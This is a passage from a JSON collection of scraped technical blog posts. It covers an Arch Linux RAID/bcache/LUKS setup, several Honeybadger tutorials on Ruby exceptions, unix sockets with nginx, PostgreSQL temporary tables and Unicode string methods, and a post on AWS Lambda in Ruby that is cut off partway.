and 2 5TB drives in\nraid1 (for 5TB of mirrored storage). The simplest thing I could think of was to\ninstall Arch on my raid1 array and use the SSD as a cache on top of it. I'd been\ncurious if that were possible for some time until I stumbled onto bcache , which is exactly what I\nwanted. I'm using 5 different file system layers which each serve a single\npurpose: Software raid (via mdadm ) SSD cache (via bcache) Encrypted file system (via LUKS) LVM btrfs My bootloader ( Syslinux atm)\nis configured on a second raid1 array (same disks, different partitions) so that\nit should also be able to tolerate a drive failure transparently. Here's what my lsblk looks like: NAME                 SIZE TYPE  MOUNTPOINT\nsda                119.2G disk\nsdb                  4.6T disk\n├─sdb1               260M part\n│ └─md127            260M raid1 /boot\n└─sdb2               4.6T part\n  └─md126            4.6T raid1\n    └─bcache0        4.6T disk\n      └─luks         4.6T crypt\n        ├─vg0-swap    16G lvm   [SWAP]\n        └─vg0-root   4.5T lvm   /\nsdc                  4.6T disk\n├─sdc1               260M part\n│ └─md127            260M raid1 /boot\n└─sdc2               4.6T part\n  └─md126            4.6T raid1\n    └─bcache0        4.6T disk\n      └─luks         4.6T crypt\n        ├─vg0-swap    16G lvm   [SWAP]\n        └─vg0-root   4.5T lvm   / sda is my SSD and sdb / sdc are my HDDs. LVM allows me to configure a volume for swap which lives inside the encrypted\nLUKS container as well as change my partitions more easily in the future. LUKS is also below the SSD cache, so any cached data is also encrypted at-rest. The rest of the drive space is used for a root volume which is formatted with\nbtrfs, which is a newer file system for Linux which allows me to create flexible\nsubvolumes which can then be snapshotted using a copy-on-write strategy. I've\nconfigured my system to take hourly snapshots of the root subvolume (where the\nOS lives) so that if an Arch update hoses something I can just restore an\nearlier snapshot. For a really interesting talk about btrfs, check out Why you\nshould consider using btrfs ... like Google\ndoes. Result So far everything seems to be working great. Arch boots up quickly and\neverything feels snappy, about the same as on my laptop's SSD, except I have 5TB\navailable. Writing files to disk is really fast until (I assume) the HDDs get\ninvolved at which point I do have some system lag if I'm transferring a massive\namount of data. So far that hasn't been a big problem for me. The real test will come when something fails... I still need to set up a full\nremote system backup and then I plan to run some failure scenarios like\nunplugging one of my HDDs and trying to boot the system, etc. I'm also very new\nto btrfs, but I really like what I've seen. If you have any questions or would like a more detailed technical guide on how\nto set up this system from scratch, hit me up on\nTwitter .", "date": "2017-03-02"},
{"website": "Honey-Badger", "title": "Nested errors in Ruby with Exception#cause", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/nested-errors-in-ruby-with-exception-cause/", "abstract": "It's a common pattern in Ruby to rescue and exception and re-raise another kind of exception. ActionView is one really obvious example of this. As I mentioned in an earlier blog post about TracePoint , ActionView swallows whatever exceptions happen in your templates and re-raises them as an ActionView::TemplateError . Sometimes this isn't good enough. You REALLY need that original exception because it has some data in it that will help you solve a problem. Fortunately, as of Ruby 2.1, you can use the Exception#cause method to do just that. Let's see how it works in practice. Here, we raise a NoMethodError , then immediately swallow it and raise a RuntimeError . We then catch the RuntimeError and use #cause to get the original NoMethodError . def fail_and_reraise raise NoMethodError rescue raise RuntimeError end begin fail_and_reraise rescue => e puts \" #{ e } caused by #{ e . cause } \" end Nested backtraces and custom attributes The #cause method actually returns the original exception object. That means that you can access any metadata that was part of the original exception. You can get the original backtrace, too. class EatingError < StandardError attr_reader :food def initialize ( food ) @food = food end end def fail_and_reraise raise EatingError . new ( \"soup\" ) rescue raise RuntimeError end begin fail_and_reraise rescue => e puts \" #{ e } caused by #{ e . cause } while eating #{ e . cause . food } \" puts e . cause . backtrace . first end To infinity and beyond! Though the examples above are only one level deep, nested exceptions in Ruby can have any number of levels. I'd be surprised if you ever needed to go more than three of four levels deep. ...but just for fun I thought I'd try making a 100-level deep nested exception. It's a silly little piece of code, and I hope you never see its like in production. def recursively_raise ( c = 0 ) raise \"Level #{ c } \" rescue => e if c < 100 recursively_raise ( c + 1 ) else recursively_print ( e ) end end def recursively_print ( e ) if e puts e recursively_print ( e . cause ) end end recursively_raise () # ... Prints the following: # Level 100 # Level 99 # Level 98 # etc.", "date": "2015-07-08"},
{"website": "Honey-Badger", "title": "How unicorn talks to nginx - an introduction to unix sockets in Ruby", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/how-unicorn-talks-to-nginx-an-introduction-to-unix-sockets-in-ruby/", "abstract": "Ruby application servers are typically used together with a web server like nginx. When user requests a page from your Rails app, nginx delegates the request to the application server. But how exactly does that work? How does nginx talk with unicorn? One of the most efficient options is to use unix sockets. Let's see how they work! In this post we'll start with the basics of sockets, and end by creating our own simple application server that is proxied by nginx. Sockets allow programs to talk with each other as if they were writing to or reading from a file. In this example, Unicorn creates the socket and monitors it for connections. Nginx can then connect to the socket and talk with Unicorn. What's a unix socket? Unix sockets let one program talk to another in a way that kind of resembles working with files. They're a type of IPC, or inter-process communication. To be accessible via a socket, your program first creates a socket and \"saves\" it to disk, just like a file. It monitors the socket for incoming connections. When it receives one, it uses standard IO methods to read and write data. Ruby provides everything you need to work with unix sockets via a couple of classes: UNIX* Server * - It creates the socket, saves it to disk,  and lets you monitor it for new connections. UNIX* Socket * - Open existing sockets for IO. NOTE: Other kinds of sockets exist. Most notably TCP sockets. But this post only deals with unix sockets. How do you tell the difference? Unix sockets have file names. The Simplest Socket We're going to look at two little programs. The first is is the \"server.\" It simply creates an instance of the UnixServer class, then uses server.accept to wait for a connection. When it receives a connection, it exchanges a greeting. It's worth noting that both the accept and readline methods block program execution until they receive what they're waiting for. require \"socket\" server = UNIXServer . new ( '/tmp/simple.sock' ) puts \"==== Waiting for connection\" socket = server . accept puts \"==== Got Request:\" puts socket . readline puts \"==== Sending Response\" socket . write ( \"I read you loud and clear, good buddy!\" ) socket . close So we have a server. Now all we need is a client. In the example below, we open the socket created by our server. Then we use normal IO methods to send and receive a greeting. require \"socket\" socket = UNIXSocket . new ( '/tmp/simple.sock' ) puts \"==== Sending\" socket . write ( \"Hello server, can you hear me? \\n \" ) puts \"==== Getting Response\" puts socket . readline socket . close To demonstrate, we first need to run the server. Then we run the client. You can see the results below: Example of a simple UNIX socket client/server interaction. The client is on the left. The server is on the right. Interfacing with nginx Now that we know how to create a unix socket \"server\" we can easily interface with nginx. Don't believe me? Let's do a quick proof-of-concept. I'm going to adapt the code above to make it print out everything it receives from the socket. require \"socket\" # Create the socket and \"save it\" to the file system server = UNIXServer . new ( '/tmp/socktest.sock' ) # Wait until for a connection (by nginx) socket = server . accept # Read everything from the socket while line = socket . readline puts line . inspect end socket . close Now if I configure nginx to forward requests to the socket at /tmp/socktest.sock I can see what data nginx is sending. (Don't worry, we'll discuss configuration in a minute) When I make a web request, nginx sends the following data to my little server: Pretty cool! It's just a normal HTTP request with a few extra headers added.  Now we're ready to build a real app server. But first, let's discuss nginx configuration. Installing and Configuring Nginx If you don't already have nginx installed on your development machine, take a second and do that now. It's really easy on OSX via homebrew: brew install nginx Now we need to configure nginx to forward requests on localhost:2048 to a upstream server via a socket named /tmp/socktest.sock . That name isn't anything special. It just needs to match the socket name used by our web server. You can save this configuration to /tmp/nginx.conf and then run nginx with the command nginx -c /tmp/nginx.conf to load it. # Run nginx as a normal console program, not as a daemon daemon off; # Log errors to stdout error_log /dev/stdout info;\n\nevents {} # Boilerplate http { # Print the access log to stdout access_log /dev/stdout; # Tell nginx that there's an external server called @app living at our socket upstream app { server unix:/tmp/socktest.sock fail_timeout=0; } server { # Accept connections on localhost:2048 listen 2048; server_name localhost; # Application root root /tmp; # If a path doesn't exist on disk, forward the request to @app try_files $uri/index.html $uri @app; # Set some configuration options on requests forwarded to @app location @app {\n      proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;\n      proxy_set_header Host $http_host;\n      proxy_redirect off;\n      proxy_pass http://app; } } } This configuration causes nginx to run like a normal terminal app, not like a daemon. It also writes all logs to stdout. When you run nginx it should look something like so: Nginx running in non-daemon mode. A DIY Application Server Now that we've seen how to connect nginx to our program, it's a pretty simple matter to build a simple application server. When nginx forwards a request to our socket it's a standard HTTP request. After a little tinkering I was able to determine that if the socket returns a valid HTTP response, then it'll be displayed in the browser. The application below takes any request and displays a timestamp. require \"socket\" # Connection creates the socket and accepts new connections class Connection attr_accessor :path def initialize ( path :) @path = path File . unlink ( path ) if File . exists? ( path ) end def server @server ||= UNIXServer . new ( @path ) end def on_request socket = server . accept yield ( socket ) socket . close end end # AppServer logs incoming requests and renders a view in response class AppServer attr_reader :connection attr_reader :view def initialize ( connection :, view :) @connection = connection @view = view end def run while true connection . on_request do | socket | while ( line = socket . readline ) != \" \\r\\n \" puts line end socket . write ( view . render ) end end end end # TimeView simply provides the HTTP response class TimeView def render %[HTTP/1.1 200 OK\n\nThe current timestamp is: #{ Time.now.to_i }\n\n] end end AppServer . new ( connection: Connection . new ( path: '/tmp/socktest.sock' ), view: TimeView . new ). run Now if I fire up nginx as well as my script, I can go to localhost:2048. Requests are sent to my app. And responses are rendered by the browser. Pretty Cool! HTTP requests are logged to STDOUT by our simple app server And here is the glorious fruit of our labors. Behold! A Timestamp! The server returns a timestamp which is displayed in the browser", "date": "2015-07-14"},
{"website": "Honey-Badger", "title": "Using Temporary Tables in PostgreSQL with Rails", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/using-temporary-tables-in-postgresql-with-rails/", "abstract": "Here at Honeybadger, we have a lot of data , which presents us with a few problems. One of the biggest challenges is data culling. Removing old data that nobody uses any more, while keeping the good stuff. Complicating matters is the fact that our data is structured hierarchically. There are Parents and Children. If we're to maintain data integrity, we have to delete the children before we delete the parent. And the children have their own associations that need to be cleaned up. If we had a smaller dataset, we could do something like this: parents . each do | parent | parent . children . each do | child | child . destroy end end Or, heck. Maybe even: parents . destroy_all But this approach would take forever due to the size of our dataset. The last thing we want to do is create a model instance for every row we're deleting. Instead, we're going to do things the hard way, using the magic of temporary tables. We'll use the temporary table as a \"scratch pad\" so all the data stays in postgres. def delete ( ids ) ActiveRecord :: Base . transaction do conn = ActiveRecord :: Base . connection # # Delete all children for this parent, then put their ids in a temporary table # sql_to_delete_children = %[\n      with deleted as (\n        delete from errors where parent_id in (#{ids}) returning id\n      ) \n      select id into temp child_deletions from deleted \n    ] conn . execute ( sql_to_delete_children ) # # Pop ids from the temporary table, 100 at a time # sql_to_pop_ids = %[\n      with deleted as (\n        delete from child_deletions \n        where id in (select id from child_deletions order by id limit 100) \n        returning id\n      ) \n      select id from deleted\n    ] while ( children = conn . select_values ( sql_to_pop_ids )). any? do # # Delete any associations belonging to the children # %w(tickets ratings facets) . each do | t | conn . execute ( \"delete from #{ t } where error_id in ( #{ children . join ( ',' ) } )\" ) end end conn . execute ( \"drop table child_deletions\" ) end end", "date": "2015-03-05"},
{"website": "Honey-Badger", "title": "A Beginner's Guide to Exceptions in Ruby", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/a-beginner-s-guide-to-exceptions-in-ruby/", "abstract": "The other day I was searching for an introduction to Ruby exceptions written for beginners - people who know basic Ruby syntax but aren't really sure what an exception is or why it's useful. I couldn't find one, so I decided to have a go at it myself. I hope you find it useful. If there are any points that are confusing, feel free to tweet at me at @StarrHorne. :) What's an exception? Exceptions are Ruby's way of dealing with unexpected events. If you've ever made a typo in your code, causing your program to crash with a message like SyntaxError or NoMethodError , then you've seen exceptions in action. When you raise an exception in Ruby, the world stops and your program starts to shut down. If nothing stops the process, your program will eventually exit with an error message. Here's an example. In the code below, we try to divide by zero. This is impossible, so Ruby raises an exception called ZeroDivisionError . The program quits and prints an error message. 1 / 0 # Program crashes and outputs: \"ZeroDivisionError: divided by 0\" Crashing programs tend to make our users angry. So we normally want to stop this shutdown process, and react to the error intelligently. This is called \"rescuing,\" \"handling,\" or \"catching\" an exception. They all mean the same thing. This is how you do it in Ruby: begin # Any exceptions in here... 1 / 0 rescue # ...will cause this code to run puts \"Got an exception, but I'm responding intelligently!\" do_something_intelligent () end # This program does not crash. # Outputs: \"Got an exception, but I'm responding intelligently!\" The exception still happens, but it doesn't cause the program to crash because it was \"rescued.\" Instead of exiting, Ruby runs the code in the rescue block, which prints out a message. This is nice, but it has one big limitation. It tells us \"something went wrong,\" without letting us know what went wrong. All of the information about what went wrong is going to be contained in an exception object. Exception Objects Exception objects are normal Ruby objects. They hold all of the data about \"what happened\" for the exception you just rescued. To get the exception object, you will use a slightly different rescue syntax. # Rescues all errors, an puts the exception object in `e` rescue => e # Rescues only ZeroDivisionError and puts the exception object in `e` rescue ZeroDivisionError => e In the second example above, ZeroDivisionError is the class of the object in e . All of the \"types\" of exceptions we've talked about are really just class names. Exception objects also hold useful debug data. Let's take a look at the exception object for our ZeroDivisionError . begin # Any exceptions in here... 1 / 0 rescue ZeroDivisionError => e puts \"Exception Class: #{ e . class . name } \" puts \"Exception Message: #{ e . message } \" puts \"Exception Backtrace: #{ e . backtrace } \" end # Outputs: # Exception Class: ZeroDivisionError # Exception Message: divided by 0 # Exception Backtrace: ...backtrace as an array... Like most Ruby exceptions, it contains a message and a backtrace along with its class name. Raising Your Own Exceptions So far we've only talked about rescuing exceptions. You can also trigger your own exceptions. This process is called \"raising.\" You do it by calling the raise method. When you raise your own exceptions, you get to pick which type of exception to use. You also get to set the error message. Here's an example: begin # raises an ArgumentError with the message \"you messed up!\" raise ArgumentError . new ( \"You messed up!\" ) rescue ArgumentError => e puts e . message end # Outputs: You messed up! As you can see, we're creating a new error object (an ArgumentError ) with a custom message (\"You messed up!\") and passing it to the raise method. This being Ruby, raise can be called in several ways: # This is my favorite because it's so explicit raise RuntimeError . new ( \"You messed up!\" ) # ...produces the same result raise RuntimeError , \"You messed up!\" # ...produces the same result. But you can only raise # RuntimeErrors this way raise \"You messed up!\" Making Custom Exceptions Ruby's built-in exceptions are great, but they don't cover every possible use case. What if you're building a user system and want to raise an exception when the user tries to access an off-limits part of the site? None of Ruby's standard exceptions fit, so your best bet is to create a new kind of exception. To make a custom exception, just create a new class that inherits from StandardError . class PermissionDeniedError < StandardError end raise PermissionDeniedError . new () This is just a normal Ruby class. That means you can add methods and data to it like any other class. Let's add an attribute called \"action\": class PermissionDeniedError < StandardError attr_reader :action def initialize ( message , action ) # Call the parent's constructor to set the message super ( message ) # Store the action in an instance variable @action = action end end # Then, when the user tries to delete something they don't # have permission to delete, you might do something like this: raise PermissionDeniedError . new ( \"Permission Denied\" , :delete ) The Class Hierarchy We just made a custom exception by subclassing StandardError , which itself subclasses Exception . In fact, if you look at the class hierarchy of any exception in Ruby, you'll find it eventually leads back to Exception . Here, I'll prove it to you. These are most of Ruby's built-in exceptions, displayed hierarchically: Exception NoMemoryError ScriptError LoadError NotImplementedError SyntaxError SignalException Interrupt StandardError ArgumentError IOError EOFError IndexError LocalJumpError NameError NoMethodError RangeError FloatDomainError RegexpError RuntimeError SecurityError SystemCallError SystemStackError ThreadError TypeError ZeroDivisionError SystemExit You don't have to memorize all of these, of course. I'm showing them to you because this idea of hierarchy is very important for a specific reason. Rescuing errors of a specific class also rescues errors of its child classes. Let's try that again... When you rescue StandardError , you not only rescue exceptions with class StandardError but those of its children as well. If you look at the chart, you'll see that's a lot: ArgumentError , IOError , etc. If you were to rescue Exception , you would rescue every single exception, which would be a very bad idea Rescuing All Exceptions (the bad way) If you want to get yelled at, go to stack overflow and post some code that looks like this: // Don ' t do this begin do_something () rescue Exception => e ... end The code above will rescue every exception. Don't do it! It'll break your program in weird ways. That's because Ruby uses exceptions for things other than errors. It also uses them to handle messages from the operating system called \"Signals.\" If you've ever pressed \"ctrl-c\" to exit a program, you've used a signal. By suppressing all exceptions, you also suppress those signals. There are also some kinds of exceptions — like syntax errors — that really should cause your program to crash. If you suppress them, you'll never know when you make typos or other mistakes. Rescuing All Errors (The Right Way) Go back and look at the class hierarchy chart and you'll see that all of the errors you'd want to rescue are children of StandardError That means that if you want to rescue \"all errors\" you should rescue StandardError . begin do_something () rescue StandardError => e # Only your app's exceptions are swallowed. Things like SyntaxErrror are left alone. end In fact, if you don't specify an exception class, Ruby assumes you mean StandardError begin do_something () rescue => e # This is the same as rescuing StandardError end Rescuing Specific Errors (The Best Approach) Now that you know how to rescue all errors, you should know that it's usually a bad idea, a code smell, considered harmful, etc. They're usually a sign that you were too lazy to figure out which specific exceptions needed to be rescued. And they will almost always come back to haunt you. So take the time and do it right. Rescue specific exceptions. begin do_something () rescue Errno :: ETIMEDOUT => e // This will only rescue Errno :: ETIMEDOUT exceptions end You can even rescue multiple kinds of exceptions in the same rescue block, so no excuses. :) begin do_something () rescue Errno :: ETIMEDOUT , Errno :: ECONNREFUSED => e end", "date": "2016-12-06"},
{"website": "Honey-Badger", "title": "Testing Ruby's Unicode Support", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/ruby-s-unicode-support/", "abstract": "Among the new features shipped with Ruby 2.4 is improved Unicode support. Specifically, methods like upcase and downcase work as expected, turning \"ä\" to \"Ä\" and back. This made me curious: what other Unicode improvements have been made since 2013\nwhen I read André Arko's blog post Strings in Ruby are UTF-8 now… right? ? I tested all of Ruby's string methods, not looking for technical errors but for violations of the \"principle of least surprise.\" Specifically,\nmy assumptions were that: Unique characters are unique: \"e\" and \"ë\" are different, just like \"e\" and \"E\" are. Single characters count as single characters, no matter how they're represented in unicode. This means that \"e\" and \"ë\" are each a single character, even though the latter is represented by two code points. Characters are immutable. Reversing a string of characters shouldn't alter the individual characters. Whitespace is treated as whitespace. Even those tricky unicode whitespace characters. Digits are treated as digits. The number 2 is always the number 2 no matter how it's written. Unfortunately, most of Ruby's string manipulation methods fail these tests. If you're working with Unicode strings, you therefore \nhave to be extremely careful which ones you use. NOTE: After publication, some readers pointed out that many of the failures I mentioned wouldn't have happened if I would have normalized the unicode test strings. This is true. However strings aren't automatically normalized by Ruby or Rails (in any of the apps I tested). These tests were always meant to illustrate the worst-case and I think they're still useful in that regard. Unicode tests with Ruby 2.4.0 Method Test Expected Result Verdict #% \"%s\" % \"noël\" \"noël\" \"noël\" OK #* \"noël\" * 2 \"noëlnoël\" \"noëlnoël\" OK #<< \"noël\" << \"ë\" \"noëlë\" \"noëlë\" OK #<=> \"ä\" <=> \"z\" -1 -1 OK #== \"ä\" == \"ä\" true true OK #=~ \"ä\" =~ /a./ nil 0 Beware! #[] \"ä\"[0] \"ä\" \"a\" Beware! #[]= \"ä\"[0] = \"u\" \"u\" \"u\" OK #b \"ä\".b.encoding.to_s \"ASCII-8BIT\" \"ASCII-8BIT\" OK #bytes \"ä\".bytes [97, 204, 136] [97, 204, 136] OK #bytesize \"ä\".bytesize 3 3 OK #byteslice \"ä\".byteslice(1) \"\\xCC\" \"\\xCC\" OK #capitalize \"ä\".capitalize \"Ä\" \"Ä\" OK #casecmp \"äa\".casecmp(\"äz\") -1 -1 OK #center \"ä\".center(3) \" ä \" \"ä \" Beware! #chars \"ä\".chars [\"ä\"] [\"a\", \"̈\"] Beware! #chomp \"ä\n\".chomp \"ä\" \"ä\" OK #chop \"ä\".chop \"\" \"a\" Beware! #chr \"ä\".chr \"ä\" \"a\" Beware! #clear \"ä\".clear \"\" \"\" OK #codepoints \"ä\".codepoints [97, 776] [97, 776] OK #concat \"ä\".concat(\"x\") \"äx\" \"äx\" OK #count \"ä\".count(\"a\") 0 1 Beware! #crypt \"123\".crypt(\"ää\") == \"123\".crypt(\"aa\") false false OK #delete \"ä\".delete(\"a\") \"ä\" \"̈\" Beware! #downcase \"Ä\".downcase \"ä\" \"ä\" OK #dump \"ä\".dump \"\\\"a\\\\u0308\\\"\" \"\\\"a\\\\u0308\\\"\" OK #each_byte \"ä\".each_byte.to_a [97, 204, 136] [97, 204, 136] OK #each_char \"ä\".each_char.to_a [\"ä\"] [\"a\", \"̈\"] Beware! #each_codepoint \"ä\".each_codepoint.to_a [97, 776] [97, 776] OK #each_line \"ä\".each_line.to_a [\"ä\"] [\"ä\"] OK #empty? \"ä\".empty? false false OK #encode \"ä\".encode(\"ASCII\", undef: :replace) \"a?\" \"a?\" OK #encoding \"ä\".encoding.to_s \"UTF-8\" \"UTF-8\" OK #end_with? \"ä\".end_with?(\"ä\") true true OK #eql? \"ä\".eql?(\"a\") false false OK #force_encoding \"ä\".force_encoding(\"ASCII\") \"a\\xCC\\x88\" \"a\\xCC\\x88\" OK #getbyte \"ä\".getbyte(2) 136 136 OK #gsub \"ä\".gsub(\"a\", \"x\") \"ä\" \"ẍ\" Beware! #hash \"ä\".hash == \"a\".hash false false OK #include? \"ä\".include?(\"a\") false true Beware! #index \"ä\".index(\"a\") nil 0 Beware! #replace \"ä\".replace(\"u\") \"u\" \"u\" OK #insert \"ä\".insert(1, \"u\") \"äu\" \"aü\" Beware! #inspect \"ä\".inspect \"\\\"ä\\\"\" \"\\\"ä\\\"\" OK #intern \"ä\".intern :ä :ä OK #length \"ä\".length 1 2 Beware! #ljust \"ä\".ljust(3, \"_\") \"ä__\" \"ä_\" Beware! #lstrip \"  ä\".lstrip \"ä\" \"ä\" OK #match \"ä\".match(\"a\") nil # Beware! #next \"ä\".next \"ä\" \"b̈\" Beware! #ord \"ä\".ord 97 97 OK #partition \"händ\".partition(\"a\") [\"händ\"] [\"h\", \"a\", \"̈nd\"] Beware! #prepend \"ä\".prepend(\"ä\") \"ää\" \"ää\" OK #replace \"ä\".replace(\"ẍ\") \"ẍ\" \"ẍ\" OK #reverse \"händ\".reverse \"dnäh\" \"dn̈ah\" Beware! #rpartition \"händ\".rpartition(\"a\") [\"händ\"] [\"h\", \"a\", \"̈nd\"] Beware! #rstrip \"line \".rstrip \"line\" \"line \" Beware! #scrub \"ä\".scrub \"ä\" \"ä\" OK #setbyte s = \"ä\"; s.setbyte(0, \"x\".ord); s \"ẍ\" \"ẍ\" OK #size \"ä\".size 1 2 Beware! #slice \"ä\".slice(0) \"ä\" \"a\" Beware! #split \"ä\".split(\"a\") [\"ä\"] [\"\", \"̈\"] Beware! #squeeze \"ää\".squeeze(\"ä\") \"ä\" \"ää\" Beware! #start_with? \"ä\".start_with?(\"a\") false true Beware! #strip \" line \".strip \"line\" \" line \" Beware! #sub \"ä\".sub(\"a\", \"x\") \"ä\" \"ẍ\" Beware! #succ \"ä\".succ \"b̈\" \"b̈\" OK #swapcase \"ä\".swapcase \"Ä\" \"Ä\" OK #to_c \"١\".to_c (1+0i) (0+0i) Beware! #to_f \"١\".to_f 1.0 0.0 Beware! #to_i \"١\".to_i 1 0 Beware! #to_r \"١\".to_r (1/1) (0/1) Beware! #to_sym \"ä\".to_sym :ä :ä OK #tr \"ä\".tr(\"a\", \"b\") \"ä\" \"b̈\" Beware! #unpack \"ä\".unpack(\"CCC\") [97, 204, 136] [97, 204, 136] OK #upto \"ä\".upto(\"c̈\").to_a [\"ä\", \"b̈\", \"c̈\"] [\"ä\", \"b̈\", \"c̈\"] OK #valid_encoding? \"ä\".valid_encoding? true true OK", "date": "2017-02-14"},
{"website": "Honey-Badger", "title": "Building, Testing and Deploying AWS Lambda Functions in Ruby", "author": ["Milap Neupane"], "link": "https://www.honeybadger.io/blog/ruby-aws-lambda/", "abstract": "Developing software can be challenging, but maintaining it is far more challenging. Maintenance includes software patches and server maintenance. In this post, we will focus on server management and maintenance. Traditionally, servers were on-premises, which means buying and maintaining physical hardware. With cloud computing, these servers no longer need to be owned physically. In 2006, when Amazon started AWS and introduced its EC2 service, the era of modern cloud computing began. With this type of service, we no longer needed to maintain physical servers or upgrade physical hardware. This solved a lot of problems, but server maintenance and resource management are still up to us. Taking these developments to the next level, we now have serverless technology. What Is Serverless Technology? Serverless technology helps offload the work of managing and provisioning servers to a cloud provider. In this post, we will be discussing AWS. The term serverless does not mean that there is no server at all. There is a server, but it is fully managed by the cloud provider. In a sense, for the users of serverless technology, there is no visible server. The servers are not directly visible to us, and the job of managing them is automated by the cloud provider. Here are some of the characteristics that make it serverless: No operational management - No need for patching servers or managing them for high availability; Scale as needed - From serving only a few users to serving millions of users; Pay as you go - The cost is managed based on usage. Serverless technology can be categorized as follows: Compute (e.g., Lambda and Fargate) Storage (e.g., S3) Data Store (e.g., DynamoDB and Aurora) Integration (e.g., API Gateway, SNS, and SQS) Analytics (e.g., Kinesis and Athena) Why Use Serverless Technology? Cost Pay as you go is one of the main advantages of using serverless technology. When there is an unpredictable change in traffic volume, you need to scale the server up or down based on usage patterns, but scaling with self-managed autoscaling can be difficult and inefficient. Serverless computing, such as AWS Lambda, can easily help save costs because there is no need to pay during idle times. Developer Productivity Since serverless computing refers to fully managed services provided by a cloud provider, there is no need for developers to provision servers or develop server applications. Developers can start coding right away without needing to manage the server. This approach also removes the need for patching servers or managing autoscaling. Saving all of this time helps increase developers' productivity. Elasticity Serverless computing is highly elastic and can scale up or down based on usage. A spike in users can be handled easily. This can be a major advantage and helps save a lot of time for developers. High Availability When computing is serverless and managed by a cloud provider and servers have high uptime, failovers are handled automatically. Managing these kinds of issues requires specialized skills. With the serverless approach, the ops' and developers' work can be done by a single person. How To Implement Serverless Functionality In Ruby According to AWS, Ruby is one of the most widely used languages in AWS. Lambda started supporting Ruby in November 2018. We will be building a web API in Ruby using only the serverless technologies provided by AWS. To create a serverless infra in AWS, we can simply log in to the AWS console and start creating them. However, we want to develop something that is easily testable and facilitates disaster recovery. We will write the serverless feature as a code. To do so, AWS provides the serverless application model (SAM). SAM is a framework used to build serverless applications in AWS. It provides YAML-based syntax for designing Lambda, databases, and APIs. AWS SAM applications can be built using AWS SAM-CLI, which can be downloaded via this link . AWS SAM CLI is built on top of AWS Cloudformation . If you are familiar with writing IaC with CoudFormation, this will be very simple. Alternatively, you can also use the serverless framework . In this post, I will be using AWS SAM. Before using SAM CLI, make sure you have the following: AWS Profile Setup Docker installed SAM CLI installed We will be developing a serverless application. We will begin by creating a few serverless infra, such as DynamoDB and Lambda, in our application. Let us start with the database: DynamoDB DynamoDB is a serverless AWS-managed database service. As it is serverless, it is very quick and easy to setup. To create DynamoDB, we define the SAM template as follows: AWSTemplateFormatVersion: '2010-09-09'\nTransform: AWS::Serverless-2016-10-31\nResources:\n  UsersTable:\n    Type: AWS::Serverless::SimpleTable\n    Properties:\n      PrimaryKey:\n        Name: id\n        Type: String\n      TableName: users With SAM CLI and the above template, we can create a basic DynamoDB table.\nFirst, we need to build a package for our serverless app. For this, we run the following command. This will build the package and push it to s3. Make sure you have created the s3 bucket with the name serverless-users-bucket before running the command: $ sam package --template-file sam.yaml \\\n              --output-template-file out.yaml \\\n              --s3-bucket serverless-users-bucket The s3 now becomes the source for the template and the code for our serverless app, which we will talk about while we create a Lambda function for it. We can now deploy this template to create the DynamoDB: $ sam deploy --template-file out.yaml \\\n             --stack-name serverless-users-app \\\n             --capabilities CAPABILITY_IAM With this, we have the DynamoDB setup in place. Next, we will create a Lambda, where this table will be used. Lambda Lambda is a serverless computing service provided by AWS. It can be used to execute code on an as-needed basis without requiring actual server management, where the code gets executed. Lambda can be used to run Async processes, REST APIs, or any scheduled jobs. All we need to do is write a handler function and push the function to AWS Lambda. Lambda will do the job of executing the task based on events . An event can be triggered by various sources, such as the API gateway, SQS, or S3; it can also be triggered by another codebase. When triggered, this Lambda function receives events and context parameters. The values in these parameters differ based on the source of the trigger. We can also manually or programmatically trigger the Lambda function by passing these events to the handler. A handler takes two arguments: Event - Events are usually a key-value hash passed from the source of the trigger. These values are automatically passed when they are triggered by various sources, such as SQS, Kinesis, or an API gateway. When triggering manually, we can pass the events here. The event contains input data for the Lambda function handler. For example, in an API gateway, the request body is contained inside this event. Context - Context is the second argument in the handler function. This contains specific details, including the source of the trigger, Lambda function name, version, request-id, and more . The output of the handler is passed back to the service that triggered the Lambda function. The output of a Lambda function is the return value of the handler function. AWS Lambda supports seven different languages in which you can code, including Ruby. Here, we will be using AWS Ruby-sdk to connect to DynamoDB. Before writing the code, let us create an infra for Lambda using a SAM template: AWSTemplateFormatVersion : \" 2010-09-09\" Transform : AWS::Serverless-2016-10-31 Description : \" Serverless users app\" Resources : CreateUserFunction : Type : AWS::Serverless::Function Properties : Handler : users.create Runtime : ruby2.7 Policies : - DynamoDBWritePolicy : TableName : !Ref UsersTable Environment : Variables : USERS_TABLE : !Ref UsersTable In the handler, we write the reference to the function to be executed as Handler: <filename>.<method_name> . Refer to the serverless policy template for a policy that you can attach to the Lambda based on the resource it uses. Since our Lambda function writes to DynamoDB, we have used DynamoDBWritePolicy in the policies section. We are also providing the env variable USERS_TABLE to the Lambda function so that it can send requests to the specified database. So, that is what we need for the Lambda infra. Now, let us write the code to create a user in DynamoDB, which the Lambda function will execute. Add the AWS record to the Gemfile: # Gemfile source 'https://rubygems.org' do gem 'aws-record' , '~> 2' end Add code to write the input to DynamoDB: # users.rb require 'aws-record' class UsersTable include Aws :: Record set_table_name ENV [ 'USERS_TABLE' ] string_attr :id , hash_key: true string_attr :body end def create ( event :, context :) body = event [ \"body\" ] id = SecureRandom . uuid user = UsersTable . new ( id: id , body: body ) user . save! user . to_h end It is very quick and easy. AWS provides the aws-record gem for accessing DynamoDB, which is very similar to Rails' activerecord . Next, run the following commands to install the dependencies. Note: Make sure that you have the same version of Ruby as defined in the Lambda. For the example here, you need Ruby2.7 installed on your machine. # install dependencies\n\n$ bundle install\n$ bundle install --deployment Package the changes: $ sam package --template-file sam.yaml \\\n              --output-template-file out.yaml \\\n              --s3-bucket serverless-users-bucket Deploy: sam deploy --template-file out.yaml \\\n             --stack-name serverless-users-app \\\n             --capabilities CAPABILITY_IAM With this code, we now have the Lambda running, which can write the input to the database. We can add an API gateway in front of the Lambda so that we can access it via HTTP calls. An API gateway provides a lot of API management functionalities, such as rate limiting and authentication. However, it can become expensive based on usage. There is a cheaper option of using only an HTTP API without API management. Based on the use case, you can choose the most appropriate one. AWS Lambda has a few limits. Some of them can be modified, but others are fixed: Memory - By default, a Lambda has 128 MB memory during its execution time. This can be increased up to 3,008 MB in increments of 64 MB. Timeout - The Lambda function has a time limit for executing the code. The default limit is 3 seconds. This can be increased up to 